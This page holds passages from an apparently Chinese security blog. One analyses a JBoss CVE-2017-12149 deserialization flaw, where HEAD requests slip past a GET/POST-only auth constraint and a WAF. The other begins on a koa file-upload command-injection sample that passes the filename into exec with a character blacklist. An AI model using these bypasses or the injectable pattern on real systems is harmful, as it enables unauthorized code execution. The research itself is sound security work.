class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">description</span>&gt;</span>A servlet that exposes the JBoss JNDI Naming service stub</span><br><span class="line">       through http, but only for a single read-only context. The return content</span><br><span class="line">       is a serialized MarshalledValue containg the org.jnp.interfaces.Naming</span><br><span class="line">       stub.</span><br><span class="line">       <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.NamingFactoryServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>namingProxyMBean<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=invoker,type=http,target=Naming,readonly=true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>proxyAttribute<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Proxy<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ### Servlet Mappings --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JNDIFactory<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/JNDIFactory/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- A mapping for the NamingFactoryServlet that only allows invocations</span></span><br><span class="line"><span class="comment">    of lookups under a read-only context. This is enforced by the</span></span><br><span class="line"><span class="comment">    ReadOnlyAccessFilter</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ReadOnlyJNDIFactory<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ReadOnlyJNDIFactory/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/EJBInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- A mapping for the JMXInvokerServlet that only allows invocations</span></span><br><span class="line"><span class="comment">    of lookups under a read-only context. This is enforced by the</span></span><br><span class="line"><span class="comment">    ReadOnlyAccessFilter</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/readonly/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Alternate mappings that place the servlets under the restricted</span></span><br><span class="line"><span class="comment">    path to required authentication for access. Remove the unsecure mappings</span></span><br><span class="line"><span class="comment">    if only authenticated users should be allowed.</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JNDIFactory<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/restricted/JNDIFactory/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/restricted/JMXInvokerServlet/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- An example security constraint that restricts access to the HTTP invoker</span></span><br><span class="line"><span class="comment">   to users with the role HttpInvoker Edit the roles to what you want and</span></span><br><span class="line"><span class="comment">   configure the WEB-INF/jboss-web.xml/security-domain element to reference</span></span><br><span class="line"><span class="comment">   the security domain you want.</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HttpInvokers<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the</span><br><span class="line">            role HttpInvoker to access the HTTP invoker servlets</span><br><span class="line">         <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/restricted/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>HttpInvoker<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">login-config</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">realm-name</span>&gt;</span>JBoss HTTP Invoker<span class="tag">&lt;/<span class="name">realm-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">security-role</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>HttpInvoker<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">security-role</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以发现存在以下路由，<br>/invoker/JNDIFactory<br>/invoker/ReadOnlyJNDIFactory<br>/invoker/EJBInvokerServlet<br>/invoker/JMXInvokerServlet<br>/invoker/readonly/JMXInvokerServlet<br>/invoker/restricted/JNDIFactory<br>/invoker/restricted/JMXInvokerServlet</p>
<p>包含JNDIFactory的路由，都是触发的org.jboss.invocation.http.servlet.NamingFactoryServlet，该Servlet没有反序列，直接抛弃。<br>/invoker/EJBInvokerServlet<br>/invoker/JMXInvokerServlet<br>/invoker/readonly/JMXInvokerServlet # 存在/invoker/readonly 也直接被拦截<br>/invoker/restricted/JMXInvokerServlet<br>以上Servlet都能够触发到反序列，一个一个测试，发现竟然只有最后一个没被拦截。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/03/03/16147769233620.jpg"><br>但是最后一个路由访问是返回401， 在web.xml中有对/restricted/路由做验证，必须在登录之后才能触发，看起来是没毛用了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HttpInvokers<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the</span><br><span class="line">         role HttpInvoker to access the HTTP invoker servlets</span><br><span class="line">      <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/restricted/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>HttpInvoker<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">login-config</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">realm-name</span>&gt;</span>JBoss HTTP Invoker<span class="tag">&lt;/<span class="name">realm-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">security-role</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">role-name</span>&gt;</span>HttpInvoker<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-role</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在网上流传的CVE-2017-12149修复方法中，其中一个方法就是修改security-constraint的url-pattern为/*，这样/invoker/readonly也需要在登录后才能够使用，缓解了漏洞。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/03/03/16147772150121.jpg"></p>
<p>在来仔细看一下JBOSS的security-constraint，很明显能够看出只对GET/POST请求模式进行验证，如果非GET/POST那么还是能够访问到/invoker/restricted/JMXInvokerServlet，但是因为这个路由是Servlet不是Filter，所以不能够随意修改请求模式，请求模式必须是RFC 2068里所定义的GET/POST/PUT/DELETE等。<br>再来看一下这个Servlet的代码，如果实现了doPut等其他方法并且存在反序列漏洞，那么还是可以绕过这个认证实现反序列。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> trace = log.isTraceEnabled();</span><br><span class="line">        <span class="keyword">if</span> (trace) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;processRequest, ContentLength: &quot;</span> + request.getContentLength());</span><br><span class="line">            log.trace(<span class="string">&quot;processRequest, ContentType: &quot;</span> + request.getContentType());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Boolean returnValueAsAttribute = (Boolean)request.getAttribute(<span class="string">&quot;returnValueAsAttribute&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.setContentType(RESPONSE_CONTENT_TYPE);</span><br><span class="line">            MarshalledInvocation mi = (MarshalledInvocation)request.getAttribute(<span class="string">&quot;MarshalledInvocation&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (mi == <span class="keyword">null</span>) &#123;</span><br><span class="line">                ServletInputStream sis = request.getInputStream();</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">                mi = (MarshalledInvocation)ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mi.getPrincipal() == <span class="keyword">null</span> &amp;&amp; mi.getCredential() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                mi.setPrincipal(InvokerServlet.GetPrincipalAction.getPrincipal());</span><br><span class="line">                mi.setCredential(InvokerServlet.GetCredentialAction.getCredential());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object[] params = <span class="keyword">new</span> Object[]&#123;mi&#125;;</span><br><span class="line">            String[] sig = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;org.jboss.invocation.Invocation&quot;</span>&#125;;</span><br><span class="line">            ObjectName invokerName = <span class="keyword">this</span>.localInvokerName;</span><br><span class="line">            <span class="keyword">if</span> (invokerName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                Integer nameHash = (Integer)mi.getObjectName();</span><br><span class="line">                invokerName = (ObjectName)Registry.lookup(nameHash);</span><br><span class="line">                <span class="keyword">if</span> (invokerName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">&quot;Failed to find invoker name for hash(&quot;</span> + nameHash + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object value = <span class="keyword">this</span>.mbeanServer.invoke(invokerName, <span class="string">&quot;invoke&quot;</span>, params, sig);</span><br><span class="line">            <span class="keyword">if</span> (returnValueAsAttribute != <span class="keyword">null</span> &amp;&amp; returnValueAsAttribute) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;returnValue&quot;</span>, value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MarshalledValue mv = <span class="keyword">new</span> MarshalledValue(value);</span><br><span class="line">                ServletOutputStream sos = response.getOutputStream();</span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(sos);</span><br><span class="line">                oos.writeObject(mv);</span><br><span class="line">                oos.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var13) &#123;</span><br><span class="line">            Throwable t = JMXExceptionDecoder.decode(var13);</span><br><span class="line">            <span class="keyword">if</span> (t <span class="keyword">instanceof</span> InvocationTargetException) &#123;</span><br><span class="line">                InvocationTargetException ite = (InvocationTargetException)t;</span><br><span class="line">                t = ite.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            InvocationException appException = <span class="keyword">new</span> InvocationException(t);</span><br><span class="line">            <span class="keyword">if</span> (returnValueAsAttribute != <span class="keyword">null</span> &amp;&amp; returnValueAsAttribute) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Invoke threw exception&quot;</span>, t);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;returnValue&quot;</span>, appException);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (response.isCommitted()) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;Invoke threw exception, and response is already committed&quot;</span>, t);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.resetBuffer();</span><br><span class="line">                MarshalledValue mv = <span class="keyword">new</span> MarshalledValue(appException);</span><br><span class="line">                ServletOutputStream sos = response.getOutputStream();</span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(sos);</span><br><span class="line">                oos.writeObject(mv);</span><br><span class="line">                oos.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.processRequest(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.processRequest(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>很可惜在该Servlet中只实现了doGet和doPost方法，所以不能像预想的PUT绕过。不过观察代码发现反序列在processRequest方法中触发，在doGet和doPost中都调用了processRequest方法。这就有点意思了，GET也能触发反序列。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">&quot;HEAD&quot;</span>)) &#123;</span><br><span class="line">            lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">            <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">            <span class="keyword">this</span>.doHead(req, resp);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doHead</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (DispatcherType.INCLUDE.equals(req.getDispatcherType())) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        NoBodyResponse response = <span class="keyword">new</span> NoBodyResponse(resp);</span><br><span class="line">        <span class="keyword">this</span>.doGet(req, response);</span><br><span class="line">        response.setContentLength();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>虽然GET也需要认证，但是给Servlet发送Head请求时触发的还是Servlet的doGet方法，只是NoBodyResponse，同时security-constraint中没有限制HEAD方法，所以可以绕过登录实现反序列。同时因为Head是NobodyResponse，所以需要直接回显命令结果的话，可以将执行结果添加到Response Headers中。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/03/03/16147805940657.jpg"></p>
<p>最终通过该方法绕过了WAF :)</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/01/05/KOA-文件上传包解析特性/"><span>KOA 文件上传包解析特性</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/01/05/KOA-文件上传包解析特性/" rel="bookmark">
        <time class="entry-date published" datetime="2021-01-05T11:46:17.000Z">
          2021-01-05
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>在一次测试中，遇到了一个nodejs的命令注入漏洞，但是存在一些过滤。<br>web所使用的框架为koa, 使用koa-body处理文件上传请求，系统为Linux, 简化后的代码如下所示。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line"><span class="keyword">const</span> koaBody = <span class="built_in">require</span>(<span class="string">&#x27;koa-body&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/([&amp;;|$`&#x27;&quot;/\\])|([.]&#123;2&#125;)/</span>);</span><br><span class="line">    <span class="keyword">return</span> !re.test(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(                </span><br><span class="line">  koaBody(&#123;</span><br><span class="line">    multipart: <span class="literal">true</span>,</span><br><span class="line">    formidable: &#123;</span><br><span class="line">      hash: <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">      maxFileSize: <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">onError</span>(<span class="params">error, ctx</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;));</span><br><span class="line"></span><br><span class="line">app.use( <span class="keyword">async</span> ( ctx ) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = ctx.request.files.file;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!checkname(file.name)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.body=<span class="string">&quot;invalid filename&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filePath = path.join(<span class="string">&quot;/tmp/web/public&quot;</span>, file.name);</span><br><span class="line">  <span class="keyword">const</span> rf = fs.readFileSync(file.path);</span><br><span class="line">  fs.writeFileSync(filePath, rf);</span><br><span class="line"></span><br><span class="line">  child_process.exec(<span class="string">`psql  -U tmp -h 127.0.0.1 -p 25432 -d test -f <span class="subst">$&#123;file.name&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  ctx.body = <span class="string">`psql  -U tmp -h 127.0.0.1 -p 25432 -d test -f <span class="subst">$&#123;file.name&#125;</span>`</span>;</span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>
<p>功能为用户上传sql文件，后端将sql文件保存在本地中，然后psql命令导入该sql文件。导入的sql路径使用绝对路径，目录不可控但是文件名并没有做随机化，使用的是用户上传的文件名加了一层checkname过滤。 </p>
<h2 id="0x01-解决换行"><a href="#0x01-解决换行" class="headerlink" title="0x01 解决换行"></a>0x01 解决换行</h2><p>因为过滤掉了 &amp; | ; 等字符，所以首先看看能不能通过参数注入实现RCE。看了下psql的help, 发现在psql command中可以通过\! command 实现命令执行.<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098338365890.jpg"></p>
<p>不过在实际的koa环境中，上传文件时文件名会截取最后一个”\“后面的字符。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> file = ctx.request.files.file;</span><br><span class="line"><span class="keyword">return</span> ctx.body=<span class="string">&quot;filename:&quot;</span> + file.name;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/01/05/16098356570802.jpg"></p>
